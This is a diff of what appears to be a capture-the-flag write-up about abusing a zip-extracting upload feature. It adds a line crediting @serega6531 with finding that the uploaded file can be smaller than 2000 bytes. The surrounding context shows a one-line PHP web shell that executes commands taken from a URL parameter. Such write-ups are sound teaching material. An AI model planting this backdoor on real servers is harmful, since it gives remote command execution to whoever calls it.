@@ -27,6 +27,8 @@ Cool it extracted the files. This is unusual behavior. How can we exploit this?
 
 Create a `shell.php` with a backdoor system command in it. The file also has to be 2000 bytes or else the upload refused to unzip the file. We pad with random numbers to get the exact filesize.
 
+    According to @serega6531, it's possible to have a filesize less than 2000 bytes.
+
 ```
 <?php
 system($_GET["cmd"]);
